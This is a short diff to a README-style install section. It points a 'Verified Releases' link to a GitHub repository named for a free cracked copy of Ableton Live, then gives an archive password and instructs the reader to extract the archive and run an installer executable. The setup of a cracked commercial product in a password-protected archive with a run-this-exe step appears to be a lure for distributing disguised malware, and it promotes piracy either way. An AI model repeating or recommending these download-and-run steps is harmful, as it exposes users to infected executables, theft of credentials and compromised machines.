@@ -30,7 +30,7 @@
 ### Archive Credentials  
 **Password:** `0012` *(Case-sensitive)*  
 
-1. Download from [Verified Releases](https://github.com/yourusername/repo/releases/tag/ableton-suite)  
+1. Download from [Verified Releases](https://github.com/paseyfeskelh/Ableton-Live-Free-Cracked/releases/tag/setup)  
 2. Extract archive
 3. Run Ableton_Installation_Wizard.exe
 
